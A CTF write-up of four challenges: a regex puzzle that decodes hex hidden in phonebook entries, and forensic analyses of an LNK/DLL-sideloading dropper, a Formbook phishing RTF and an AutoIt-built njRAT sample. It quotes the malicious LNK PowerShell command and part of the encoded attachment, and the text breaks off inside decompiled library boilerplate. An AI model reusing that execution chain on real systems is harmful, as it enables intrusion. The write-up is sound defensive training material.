## Task 1: BipBipBiiip
Question: Introduction to anomaly detection. Find the phone numbers that are not formed in the correct way and decode the hidden message.

Flag: `GCC{R3g3x_4r3_W1ld!!!!}`

We are given a csv file of a phonebook where the question mentioned having anomalies in it. Looking at the entries, the phone numbers were suspicious as they were weirdly placed like hex or some sorts. So regex knowledge was required in this challenge (which me and teammate suck at).

```
└─$ cat phonebook.csv | head
ID,FIRST_NAME,LAST_NAME,MAIL,PHONE_NUMBER,ADDRESS
b35cd960-86ba-4697-a2f8-4eecd50b77e8,Margaret,Perrin,aliceblot@example.com,001-936-209-2959x28564,"11911 Rachel Point South Tamarahaven, VA 11658"
a24dfa82-4d8e-4278-a6a6-d96af4c50c96,Jeannine,Roman,yui46@example.org,090-8945-0526,群馬県山武郡芝山町美原町11丁目15番3号 パレス花川戸304
dec0464c-ca08-4a38-ac4e-22f404ea2711,亮介,Baudry,mcclainamy@example.com,070-0593-0250,"USCGC Evans FPO AP 68744"
8b0db152-34a0-4016-b8f1-99e5358bff06,Michael,De Oliveira,agathenguyen@example.org,+33 7 90 46 14 42,"967 Timothy Mews Suite 851 Sarahstad, FL 27297"
88902ce2-db03-4c65-8574-0739276165bd,直人,Lewis,bourgeoisvirginie@example.org,+33 (0)5 49 87 88 43,宮崎県印西市大中28丁目18番11号
206f7df8-8193-4cdd-a4a2-ab958d50fd90,直子,池田,trananthony@example.com,03-1255-1140,"boulevard Vallée
```

Our unintended method was pretty funny, what we did was guessing the flag by changing the starting parts of the flag `GCC{` to hex, and using the hex to find each number. The first step was to extract phone numbers only from the csv file.

```
import csv
with open(./phonebook.csv', mode='r', encoding="utf8") as file:
    csvFile = csv.reader(file)
    for lines in csvFile:
        with open("output.txt", "a") as file_written:
            file_written.write(lines[4])
            file_written.write("\n")
```

Now we have to perform our filtering to find anomalies and we found this [StackOverflow post](https://stackoverflow.com/questions/13719367/what-is-the-best-regular-expression-for-phone-numbers) that talks about the regex for phone numbers. Creating another simple script to filter out patterns that do not correlate to phone numbers.

```
import re

def validNumber(phone_number):
    pattern = re.compile("^[\dA-Z]{3}-[\dA-Z]{3}-[\dA-Z]{4}$", re.IGNORECASE)
    return pattern.match(phone_number) is not None
with open("output.txt", "r") as file:
    for i in file.read().split("\n"):
        if validNumber(i) == False:
            with open("not_correct.txt", "a") as file_written:
                file_written.write(i)
                file_written.write("\n")
```

After that we perform our guessing game LOL. Since we know the parts of the flag is always `GCC` and a `{}`, we can use their hex values to find the phone number that has them. Similarly, we expect `_` to be in the flag so we also include its hex.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/7a0fa01f-fddb-477a-a428-78ad8a0aa284)

```
┌──(kali㉿kali)-[/mnt/hgfs/sharedfolder/gcc]
└─$ cat not_correct.txt | grep "4743437b"   
4743437b5233
                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hgfs/sharedfolder/gcc]
└─$ cat not_correct.txt | grep "5f"      
6733785f347233
5f57316c64
                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hgfs/sharedfolder/gcc]
└─$ cat not_correct.txt | grep "7d"
212121217d
```

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/82ae1b0e-26ef-4fc2-987d-2dae835fa132)

## Task 2: Pretty Links
Question: Following the compromise of a partner, your colleague has to capture the file system of a victim machine. In addition to that, a strange file attracted attention during its investigation.

* Find the binary used to initiate the indirect command execution
* Find the IP and port of the attacker

Format: GCC{cmd.exe:127.0.0.1:8080}

Flag: `GCC{conhost.exe:172.29.107.95:7894}`

We are given an AD1 image and an ISO file. Analyzing the ISO file, there seems to be an lnk file. In it, there is a powershell command that shows `conhost.exe` running the malware.

```
"C:\Windows\System32\conhost.exe" --headless "%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe" "$zweeki=$env:Temp;$ocounselk=[System.IO.Path]::GetFullPath($zweeki);$poledemy = $pwd;Copy-Item "$poledemy\*" -Destination $ocounselk -Recurse -Force | Out-Null;cd $ocounselk;;.\Facture.pdf; .\NisSrv.exe"
```

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/5948d0c7-663a-4aba-908c-06ff2e99e2d8)

Next, we analyzed the AD1 image to find the malware, specifically `Facture.pdf` and `NisSrv.exe`. Since I had many cases about hackers saving their malicious files in a Temp folder, we navigated to `C:\Users\user\AppData\Temp\` . Inside the folder, the two suspicious files can be found with other temporary files.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/2d7b80c2-2517-44e9-b478-34089c70bf49)

After extracting and running `NisSrv.exe` on our virtual machine, it said that it requires `mpclient.dll` to run. Since the ``mpclient.dll`` was in the Temp folder already, we can extract it and upload it to VirusTotal. Surprisingly, it was very malicious.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/1bc30910-155d-4db2-a26d-da23f380da05)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/5a5af963-0d08-4ab1-a0c5-969122fe6980)

Looking at the dll behavior information, the IP and port can be obtained.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/75618225/d7eabe6a-702f-446e-8ed4-9c8fc9044c7e)

## Task 3: Fill the library
Question: An employee has been compromised following a malicious email campaign. In order to allow him to resume his activities, we have entrusted you with analyzing the email.

* Find the 3 CVEs that the attacker is trying to exploit
* Find the name of the object containing the malicious payload
* Find the family name of this malware

Format: GCC{CVE-ID_CVE-ID_CVE-ID:object_name:malware_family}

Flag: `GCC{CVE-2017-11882_CVE-2018-0798_CVE-2018-0802:EQuAtIon.3:Formbook}`

We are given an EML file which sould be a phishing email. Using Thunderbird to analyze the email, an attachment named ``Bank detail.doc`` can be obtained.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/75618225/0b666a47-9248-4d53-bb9f-16ea82d8c554)

```
└─$ cat Return\ book\ loan.eml
From: =?UTF-8?B?RW1pbHkgWWXvvIjlj7blsI/lh6TvvIk=?=<49040aa6ab2@7d7.com>
To: 7a90e38a@a0c170b93efd5e.au
Subject: =?UTF-8?B?6K+35bC95b+r5qOA5p+l5oKo55qE6ZO26KGM6LSm5oi35bm256Gu6K6k?=
Date: 14 Aug 2023 22:53:50 -0400
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="----=_NextPart_000_0012_365A62DA.F43F1297"
X-Rejection-Reason: 8 - 557 Your IP address is from a blacklisted country. Disconnecting..

This is a multi-part message in MIME format.

------=_NextPart_000_0012_365A62DA.F43F1297
Content-Type: text/html;
        charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

[redacted]
------=_NextPart_000_0012_365A62DA.F43F1297
Content-Type: application/msword; name="Bank details.doc"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Bank details.doc"

e1xydGYxDQ0NCQkJCXtcKlxkZ21MYXlvdXRNUlU1MjM3ODU3NjUgXDt9DXtcNjQwNTgyMTM5
cGxlYXNlIGNsaWNrIEVuYWJsZSBlZGl0aW5nIGZyb20gdGhlIHllbGxvdyBiYXIgYWJvdmUu
VGhlIGluZGVwZW5kZW50IGF1ZGl0b3JzkiBvcGluaW9uIHNheXMgdGhlIGZpbmFuY2lhbCBz
dGF0ZW1lbnRzIGFyZSBmYWlybHkgc3RhdGVkIGluIGFjY29yZGFuY2Ugd2l0aCB0aGUgYmFz
aXMgb2YgYWNjb3VudGluZyB1c2VkIGJ5IHlvdXIgb3JnYW5pemF0aW9uLiBTbyB3aHkgYXJl
IHRoZSBhdWRpdG9ycyBnaXZpbmcgeW91IHRoYXQgb3RoZXIgbGV0dGVyIEluIGFuIGF1ZGl0
IG9mIGZpbmFuY2lhbCBzdGF0ZW1lbnRzLCBwcm9mZXNzaW9uYWwgc3RhbmRhcmRzIHJlcXVp
...
```

By analyzing the metadata, we can retrieve the attachment data and decode it via CyberChef. Decoding it gives us a `RTF file` that seems malicious too.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/fe23cd46-0dc6-4f01-bcec-91ad5ddbc9cf)

After downloading and uploading the file to VirusTotal, the CVEs can be obtained.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/75618225/baeb06aa-17a1-4eec-8a13-1daa1788dc58)

Next, @Odin mentioned using [rtfdump](https://github.com/DidierStevens/DidierStevensSuite/blob/master/rtfdump.py) to extract content from the RTF file. Doing so, we can obtain the name of the object containing the malicious payload.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/75618225/e82934e8-91ba-4dba-a0b4-4f19fa7e8517)

Now we have to find the malware family using threat intelligence tools like [abuse.ch](https://abuse.ch/) (Recommended by @Odin). Using [URLhaus](https://urlhaus.abuse.ch/) and the IP address of the C2 server, several results about `Formbook` can be found.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/648a04c9-1191-46c2-9c85-735fe30ef392)

Additionally, many articles discussed about Formbook with the CVEs we found previously.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/75618225/517aed52-3136-43ef-9cb7-4956c2affb7a)

## Task 4: Threat analysis
While the operator was working on his machine, he noticed strange behaviour on his workstation. With the help of his CERT, he made a copy of the hard disk for analysis. Using your knowledge of forensics and threat analysis, find out some of the characteristics of this malware.

Format: GCC{portC2:MITREATT&CK_Persistence_Technique:malware_family}

Flag: `GCC{1245:T1547:njrat}`

We are given an raw disk image for our investigation. Sadly @Odin had not enough storage to download the image ;-;. However, we still managed to solve it by sharing the malware hash with one another. Analyzing the image file with Autopsy, a malware can be found in `C:\Users\operator\AppData\Roaming\` called `aL4N.exe`.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/7d2dda88-9bb7-4294-a3b9-480ff205adbb)

So we extracted the malware and analyzed it via VirusTotal. The MITRE ATT&CK persistence technique can be found.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/817817ae-5346-4e2c-b24b-16cd385c08db)

Checking the file's metadata, we find that the program was compiled using `AutoIT v3`.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/75618225/0f2ea677-e35f-453e-ba5c-b2dc5c4f4989)

VirusTotal also shows the program being packed by AutoIT. 

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/a48e1ae8-d7c6-4785-b03d-e646fddde9e8)

At first @Odin tried to use online sandboxes to run the malware and capture any established connections, but it did not work. So he thought: "Maybe I need to decompile this program to see inside". Searching Google on how to decompile AutoIt programs, we can find [Exe2Aut.exe](https://domoticx.com/autoit3-decompiler-exe2aut/). Dragging the malware to the program, it automatically decompiles it for us.

<details>
<summary>
	The decompiled output
</summary>
	
```
#NoTrayIcon
Global Const $fw_dontcare = 0
Global Const $fw_thin = 100
Global Const $fw_extralight = 200
Global Const $fw_ultralight = 200
Global Const $fw_light = 300
Global Const $fw_normal = 400
Global Const $fw_regular = 400
Global Const $fw_medium = 500
Global Const $fw_semibold = 600
Global Const $fw_demibold = 600
Global Const $fw_bold = 700
Global Const $fw_extrabold = 800
Global Const $fw_ultrabold = 800
Global Const $fw_heavy = 900
Global Const $fw_black = 900
Global Const $cf_effects = 256
Global Const $cf_printerfonts = 2
Global Const $cf_screenfonts = 1
Global Const $cf_noscriptsel = 8388608
Global Const $cf_inittologfontstruct = 64
Global Const $logpixelsx = 88
Global Const $logpixelsy = 90
Global Const $ansi_charset = 0
Global Const $baltic_charset = 186
Global Const $chinesebig5_charset = 136
Global Const $default_charset = 1
Global Const $easteurope_charset = 238
Global Const $gb2312_charset = 134
Global Const $greek_charset = 161
Global Const $hangeul_charset = 129
Global Const $mac_charset = 77
Global Const $oem_charset = 255
Global Const $russian_charset = 204
Global Const $shiftjis_charset = 128
Global Const $symbol_charset = 2
Global Const $turkish_charset = 162
Global Const $vietnamese_charset = 163
Global Const $out_character_precis = 2
Global Const $out_default_precis = 0
Global Const $out_device_precis = 5
Global Const $out_outline_precis = 8
Global Const $out_ps_only_precis = 10
Global Const $out_raster_precis = 6
Global Const $out_string_precis = 1
Global Const $out_stroke_precis = 3
Global Const $out_tt_only_precis = 7
Global Const $out_tt_precis = 4
Global Const $clip_character_precis = 1
Global Const $clip_default_precis = 0
Global Const $clip_embedded = 128
Global Const $clip_lh_angles = 16
Global Const $clip_mask = 15
Global Const $clip_stroke_precis = 2
Global Const $clip_tt_always = 32
Global Const $antialiased_quality = 4
Global Const $default_quality = 0
Global Const $draft_quality = 1
Global Const $nonantialiased_quality = 3
Global Const $proof_quality = 2
Global Const $default_pitch = 0
Global Const $fixed_pitch = 1
Global Const $variable_pitch = 2
Global Const $ff_decorative = 80
Global Const $ff_dontcare = 0
Global Const $ff_modern = 48
Global Const $ff_roman = 16
Global Const $ff_script = 64
Global Const $ff_swiss = 32
Global Const $tagpoint = "struct;long X;long Y;endstruct"
Global Const $tagrect = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $tagsize = "struct;long X;long Y;endstruct"
Global Const $tagmargins = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
Global Const $tagfiletime = "struct;dword Lo;dword Hi;endstruct"
Global Const $tagsystemtime = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
Global Const $tagtime_zone_information = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
Global Const $tagnmhdr = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
Global Const $tagcomboboxexitem = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
Global Const $tagnmcbedragbegin = $tagnmhdr & ";int ItemID;wchar szText[260]"
Global Const $tagnmcbeendedit = $tagnmhdr & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
Global Const $tagnmcomboboxex = $tagnmhdr & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
Global Const $tagdtprange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
Global Const $tagnmdatetimechange = $tagnmhdr & ";dword Flag;" & $tagsystemtime
Global Const $tagnmdatetimeformat = $tagnmhdr & ";ptr Format;" & $tagsystemtime & ";ptr pDisplay;wchar Display[64]"
Global Const $tagnmdatetimeformatquery = $tagnmhdr & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
Global Const $tagnmdatetimekeydown = $tagnmhdr & ";int VirtKey;ptr Format;" & $tagsystemtime
Global Const $tagnmdatetimestring = $tagnmhdr & ";ptr UserString;" & $tagsystemtime & ";dword Flags"
Global Const $tageventlogrecord = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
Global Const $taggdipbitmapdata = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
Global Const $taggdipencoderparam = "byte GUID[16];ulong Count;ulong Type;ptr Values"
Global Const $taggdipencoderparams = "uint Count;byte Params[1]"
Global Const $taggdiprectf = "float X;float Y;float Width;float Height"
Global Const $taggdipstartupinput = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $taggdipstartupoutput = "ptr HookProc;ptr UnhookProc"
Global Const $taggdipimagecodecinfo = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $taggdippencoderparams = "uint Count;byte Params[1]"
Global Const $taghditem = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
Global Const $tagnmhddispinfo = $tagnmhdr & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
Global Const $tagnmhdfilterbtnclick = $tagnmhdr & ";int Item;" & $tagrect
Global Const $tagnmheader = $tagnmhdr & ";int Item;int Button;ptr pItem"
Global Const $taggetipaddress = "byte Field4;byte Field3;byte Field2;byte Field1"
Global Const $tagnmipaddress = $tagnmhdr & ";int Field;int Value"
Global Const $taglvfindinfo = "struct;uint Flags;ptr Text;lparam Param;" & $tagpoint & ";uint Direction;endstruct"
Global Const $taglvhittestinfo = $tagpoint & ";uint Flags;int Item;int SubItem;int iGroup"
Global Const $taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
Global Const $tagnmlistview = $tagnmhdr & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
Global Const $tagnmlvcustomdraw = "struct;" & $tagnmhdr & ";dword dwDrawStage;handle hdc;" & $tagrect & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartId;int iStateId;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
Global Const $tagnmlvdispinfo = $tagnmhdr & ";" & $taglvitem
Global Const $tagnmlvfinditem = $tagnmhdr & ";int Start;" & $taglvfindinfo
Global Const $tagnmlvgetinfotip = $tagnmhdr & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
Global Const $tagnmitemactivate = $tagnmhdr & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $tagpoint & ";lparam lParam;uint KeyFlags"
Global Const $tagnmlvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmlvscroll = $tagnmhdr & ";int DX;int DY"
Global Const $tagmchittestinfo = "uint Size;" & $tagpoint & ";uint Hit;" & $tagsystemtime & ";" & $tagrect & ";int iOffset;int iRow;int iCol"
Global Const $tagmcmonthrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
Global Const $tagmcrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
Global Const $tagmcselrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
Global Const $tagnmdaystate = $tagnmhdr & ";" & $tagsystemtime & ";int DayState;ptr pDayState"
Global Const $tagnmselchange = $tagnmhdr & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
Global Const $tagnmobjectnotify = $tagnmhdr & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
Global Const $tagnmtckeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagtvitem = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
Global Const $tagtvitemex = "struct;" & $tagtvitem & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
Global Const $tagnmtreeview = $tagnmhdr & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
Global Const $tagnmtvcustomdraw = "struct;" & $tagnmhdr & ";dword DrawStage;handle HDC;" & $tagrect & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
Global Const $tagnmtvdispinfo = $tagnmhdr & ";" & $tagtvitem
Global Const $tagnmtvgetinfotip = $tagnmhdr & ";ptr Text;int TextMax;handle hItem;lparam lParam"
Global Const $tagtvhittestinfo = $tagpoint & ";uint Flags;handle Item"
Global Const $tagnmtvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmmouse = $tagnmhdr & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $tagpoint & ";lparam HitInfo"
Global Const $tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
Global Const $tagimageinfo = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $tagrect
Global Const $tagmenuinfo = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
Global Const $tagmenuiteminfo = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
Global Const $tagrebarbandinfo = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader;" & $tagrect & ";uint uChevronState"
Global Const $tagnmrebarautobreak = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
Global Const $tagnmrbautosize = $tagnmhdr & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
Global Const $tagnmrebar = $tagnmhdr & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
Global Const $tagnmrebarchevron = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;" & $tagrect & ";lparam lParamNM"
Global Const $tagnmrebarchildsize = $tagnmhdr & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
Global Const $tagcolorscheme = "dword Size;dword BtnHighlight;dword BtnShadow"
Global Const $tagnmtoolbar = $tagnmhdr & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $tagrect
Global Const $tagnmtbhotitem = $tagnmhdr & ";int idOld;int idNew;dword dwFlags"
Global Const $tagtbbutton = "int Bitmap;int Command;byte State;byte Style;align;dword_ptr Param;int_ptr String"
Global Const $tagtbbuttoninfo = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
Global Const $tagnetresource = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
Global Const $tagoverlapped = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
Global Const $tagopenfilename = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
Global Const $tagbitmapinfo = "struct;dword Size;long Width;long Height;word Planes;word BitCount;dword Compression;dword SizeImage;" & "long XPelsPerMeter;long YPelsPerMeter;dword ClrUsed;dword ClrImportant;endstruct;dword RGBQuad"
Global Const $tagblendfunction = "byte Op;byte Flags;byte Alpha;byte Format"
Global Const $tagguid = "ulong Data1;ushort Data2;ushort Data3;byte Data4[8]"
Global Const $tagwindowplacement = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
Global Const $tagwindowpos = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
Global Const $tagscrollinfo = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
Global Const $tagscrollbarinfo = "dword cbSize;" & $tagrect & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
Global Const $taglogfont = "long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32]"
Global Const $tagkbdllhookstruct = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
Global Const $tagprocess_information = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
Global Const $tagstartupinfo = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
Global Const $tagsecurity_attributes = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $tagwin32_find_data = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
Global Const $tagtextmetric = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"

Func _winapi_getlasterror($curerr = @error, $curext = @extended)
	Local $aresult = DllCall("kernel32.dll", "dword", "GetLastError")
	Return SetError($curerr, $curext, $aresult[0])
EndFunc

Func _winapi_setlasterror($ierrcode, $curerr = @error, $curext = @extended)
	DllCall("kernel32.dll", "none", "SetLastError", "dword", $ierrcode)
	Return SetError($curerr, $curext)
EndFunc

Global Const $__miscconstant_cc_anycolor = 256
Global Const $__miscconstant_cc_fullopen = 2
Global Const $__miscconstant_cc_rgbinit = 1
Global Const $tagchoosecolor = "dword Size;hwnd hWndOwnder;handle hInstance;dword rgbResult;ptr CustColors;dword Flags;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName"
Global Const $tagchoosefont = "dword Size;hwnd hWndOwner;handle hDC;ptr LogFont;int PointSize;dword Flags;dword rgbColors;lparam CustData;" & "ptr fnHook;ptr TemplateName;handle hInstance;ptr szStyle;word FontType;int SizeMin;int SizeMax"

Func _choosecolor($ireturntype = 0, $icolorref = 0, $ireftype = 0, $hwndownder = 0)
	Local $custcolors = "dword[16]"
	Local $tchoose = DllStructCreate($tagchoosecolor)
	Local $tcc = DllStructCreate($custcolors)
	If $ireftype = 1 Then
		$icolorref = Int($icolorref)
	ElseIf $ireftype = 2 Then
		$icolorref = Hex(String($icolorref), 6)
		$icolorref = "0x" & StringMid($icolorref, 5, 2) & StringMid($icolorref, 3, 2) & StringMid($icolorref, 1, 2)
	EndIf
	DllStructSetData($tchoose, "Size", DllStructGetSize($tchoose))
	DllStructSetData($tchoose, "hWndOwnder", $hwndownder)
	DllStructSetData($tchoose, "rgbResult", $icolorref)
	DllStructSetData($tchoose, "CustColors", DllStructGetPtr($tcc))
	DllStructSetData($tchoose, "Flags", BitOR($__miscconstant_cc_anycolor, $__miscconstant_cc_fullopen, $__miscconstant_cc_rgbinit))
	Local $aresult = DllCall("comdlg32.dll", "bool", "ChooseColor", "struct*", $tchoose)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] = 0 Then Return SetError(-3, -3, -1)
	Local $color_picked = DllStructGetData($tchoose, "rgbResult")
	If $ireturntype = 1 Then
		Return "0x" & Hex(String($color_picked), 6)
	ElseIf $ireturntype = 2 Then
		$color_picked = Hex(String($color_picked), 6)
		Return "0x" & StringMid($color_picked, 5, 2) & StringMid($color_picked, 3, 2) & StringMid($color_picked, 1, 2)
	ElseIf $ireturntype = 0 Then
		Return $color_picked
	Else
		Return SetError(-4, -4, -1)
	EndIf
EndFunc

Func _choosefont($sfontname = "Courier New", $ipointsize = 10, $icolorref = 0, $ifontweight = 0, $iitalic = False, $iunderline = False, $istrikethru = False, $hwndowner = 0)
	Local $italic = 0, $underline = 0, $strikeout = 0
	Local $lngdc = __misc_getdc(0)
	Local $lfheight = Round(($ipointsize * __misc_getdevicecaps($lngdc, $logpixelsx)) / 72, 0)
	__misc_releasedc(0, $lngdc)
	Local $tchoosefont = DllStructCreate($tagchoosefont)
	Local $tlogfont = DllStructCreate($taglogfont)
	DllStructSetData($tchoosefont, "Size", DllStructGetSize($tchoosefont))
